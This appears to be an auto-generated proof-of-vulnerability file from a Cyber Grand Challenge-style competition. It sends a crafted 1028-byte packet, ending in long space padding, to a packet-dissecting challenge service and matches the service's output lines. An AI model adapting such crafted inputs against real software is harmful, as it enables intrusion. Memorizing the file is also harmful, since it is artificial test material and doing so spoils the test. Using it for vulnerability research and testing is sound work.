#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xf5\x22\xf2\xd8"
         "\x2b\x86\x0b\x1a\x7c\xb2\x0e\x50\x72\x01\x00\x00\x1a\x91\xe9\x9e"
         "\xce\x58\xcc\x03\x64\x35\x34\xb9\x25\x90\xe4\xf4\xf4\x61\xf9\x92"
         "\x69\x7e\x26\x00\x9b\x9a\xff\x3c\x7d\x77\x3d\xba\x21\x58\x41\x1d"
         "\x54\x94\xd9\x24\x1b\x2b\xc1\x87\xeb\x73\xb2\x01\x71\x29\x17\xd8"
         "\x64\xed\x80\xd7\x22\x38\xcc\xe6\x77\x37\x96\x83\x7b\xde\x9b\xf6"
         "\xf1\x8d\x11\x18\xe5\x6d\xac\xaf\xe6\xc3\xa2\x3b\x8c\x96\x36\x4b"
         "\x19\xb6\xb0\x10\xdd\x7a\x96\x04\x55\xa5\x84\x46\xd4\xcf\xf1\xe7"
         "\x7e\xd8\xfc\xb5\x3b\x0e\xfe\x53\xd8\xf9\x3e\x1f\x1c\x94\x2b\x86"
         "\xdf\x85\x30\x74\x65\x55\xa1\xb8\xbd\x67\xf4\x4d\x2a\x90\xde\x52"
         "\x65\xfe\xfb\xb4\x81\xd4\xca\x62\xa5\xeb\x38\x80\x03\x60\x59\xd6"
         "\xea\x56\xee\xa4\x8e\xd6\xdb\x79\x39\x4d\x97\xc9\x0a\x9d\xa4\x7e"
         "\xcb\xbe\x93\x1c\x14\xf9\x1e\x3c\x76\xe5\x9e\xeb\xd8\x18\x17\x76"
         "\x3d\x24\xc4\x46\x21\xa4\x03\x49\xfc\x37\xa9\xea\x68\xa2\xea\x3d"
         "\x00\xbe\x46\x5d\xbf\x7a\x16\x24\x0f\xba\x46\x30\xbb\x5e\x10\x5d"
         "\xbd\x21\x62\x69\xe6\xc0\xc5\x23\xa7\xd2\xd6\x0e\x43\x1c\xac\x99"
         "\xe3\xd7\x4c\x03\xa5\x1a\x5a\x2e\xab\xa4\xf1\x7e\xf1\x5e\xdf\xf7"
         "\x6f\x07\x89\x64\x13\xb3\xb0\x68\x1e\x5d\x43\x55\xd2\x23\x35\xa6"
         "\x8e\xe7\x28\xa1\x2f\xab\xb9\x00\x49\xff\x28\xaf\xcb\xde\x0a\xb1"
         "\xd5\xba\x56\x0e\xc3\x1c\xd3\x46\x48\xb9\x15\x73\x2e\x29\xd3\x3d"
         "\xdf\x43\xc2\xd4\xc4\x5e\xe8\xa7\xd3\x85\xa4\x40\xd7\xca\x12\x0c"
         "\x2c\xac\x79\x5c\xa1\xca\x8c\xc3\x11\x4a\xaa\x19\xb8\x7d\x0b\xb8"
         "\x0f\xe6\x8e\xb7\xba\x34\xaa\x5e\xc9\xa4\xcd\xfa\x90\xa7\x70\x20"
         "\xac\x33\x99\x78\x7a\xf9\x9a\x3b\x5b\x3e\xce\xae\xe7\xce\x9a\x53"
         "\xd2\x70\x12\xc3\xa0\x53\xa2\xf6\x16\x08\x3b\x86\x01\x9c\xdf\x66"
         "\xdd\x21\x9c\x89\xd7\xb4\x42\x69\xfa\x07\xfd\xa5\xa7\x13\x13\x3b"
         "\x01\x04\xd1\xdf\x3c\xcd\x96\xaa\x86\xe1\x3d\x80\x97\x24\x88\x4c"
         "\x46\xd9\x4b\x2b\x49\x34\xb4\xf7\x7e\xc0\x76\x9d\x2b\x95\xc9\xc2"
         "\xcb\x3f\x8b\x67\x66\x62\xb0\x2f\xaf\xe3\x26\xa7\x26\xf6\xa8\x26"
         "\x16\x94\x6b\xc0\x8b\x79\xd7\x6a\x13\xa6\x49\x15\xd2\x58\xb2\xaf"
         "\x42\x05\x33\xde\x18\xbe\x73\x65\xa3\xea\x85\x5b\x09\xfc\x82\x89"
         "\x55\x1a\x8d\x52\xc3\x8f\x74\xac\x61\xff\x65\xd1\x11\x3c\xaa\x66"
         "\x73\x36\x45\x8f\x7a\xfa\x9c\x27\x5c\xe5\xc6\x60\xf1\xa3\x2f\xc4"
         "\x6c\x28\x62\xd1\x47\x4c\x42\x9b\xe4\x5c\x38\xb9\x2b\x23\xab\xb1"
         "\x70\x53\x53\x22\x39\x35\x4f\xc2\x1c\x6b\xbc\x7c\x20\x29\x7f\xc7"
         "\x49\x80\x51\x03\x7b\x42\x8e\x14\xf2\xab\x0d\x41\x2e\xf1\x6a\xaa"
         "\x26\x00\xdc\x0f\xcb\x34\x8a\x59\x01\xcb\x33\x1d\x2c\xd8\x50\xe8"
         "\x13\xc9\x05\x2d\x48\xe7\xe2\xbd\x99\x2a\xe0\x85\x82\xf8\x2b\xc8"
         "\xde\xe8\x38\xd8\xe1\x07\xc7\x43\x38\xb5\xf7\x30\x64\xd3\xdc\x8e"
         "\xa1\x25\x1f\x7d\xf2\x35\x5e\xfb\xac\xc5\xa4\xfa\xf3\x8b\x9a\x7f"
         "\x93\xc0\x44\xb3\xd8\x03\xc6\x50\x47\xe2\xc0\x85\x0b\xec\xbc\x9c"
         "\x8b\xb7\x69\x2d\x8b\xdf\xae\x92\x88\x8e\xba\xb2\x53\x48\x0a\xca"
         "\x5a\x62\x00\xea\x3e\xac\x6b\xb0\xc9\xaa\x51\x2e\xcd\x7b\xf7\x81"
         "\xc4\x91\x27\x6a\x3b\x68\xd2\xdc\x8e\x2b\x12\x80\xce\xf8\xaa\xf7"
         "\xe4\x9c\x03\xcb\xca\x8f\x6f\xf0\x57\x88\x33\x83\xfc\xa0\x3b\xd3"
         "\x90\xf8\xc7\x53\x58\xa4\x61\xff\xf1\x59\x75\xe8\x25\xa6\x93\x55"
         "\x6a\xe6\xfa\xb5\x48\xce\x53\x81\xcc\xd2\xfe\x2f\x53\x16\x57\x9f"
         "\x87\xa1\x50\x43\x59\x8d\x83\xa9\xee\xa3\x12\x96\x19\x85\x3a\x91"
         "\x4d\x8a\x44\xa6\xb2\x3a\xf4\x7c\x80\x68\x67\xb9\x1f\x31\x88\xf8"
         "\xd4\x87\x32\x36\x79\x72\x73\xda\x47\x5a\x13\xad\xcd\x9e\xcd\x26"
         "\x26\x00\x25\xa5\x5d\xd0\x7a\x5e\x4b\x96\xa3\xe8\x3d\xd5\xc7\xa2"
         "\x1b\x54\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===Ciceronicpownie
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x43\x69\x63\x65\x72\x6f\x6e\x69\x63\x70\x6f"
         "\x77\x6e\x69\x65";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*===purgaNycticorax
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x70\x75\x72\x67\x61\x4e\x79\x63\x74\x69\x63"
         "\x6f\x72\x61\x78";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00005;
      unsigned int read_00005_len;
      unsigned int read_00005_ptr = 0;
      //**** delimited read
      static unsigned char read_00005_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00005 = NULL;
      read_00005_len = 0;
      int read_00005_res = cgc_delimited_read(0, &read_00005, &read_00005_len, read_00005_delim, 4);
      if (read_00005_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00005_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00005_00000_match;
      pcre *read_00005_00000_pcre = cgc_init_regex(read_00005_00000_regex);
      if (read_00005_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00005_00000_pcre, 0, read_00005 + read_00005_ptr, read_00005_len - read_00005_ptr, &read_00005_00000_match);
         if (rc > 0) {
            read_00005_ptr += read_00005_00000_match.match_end - read_00005_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00005_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00005);
      if (read_00005_ptr) {}  //silence unused variable warning if any
   } while (0);
}
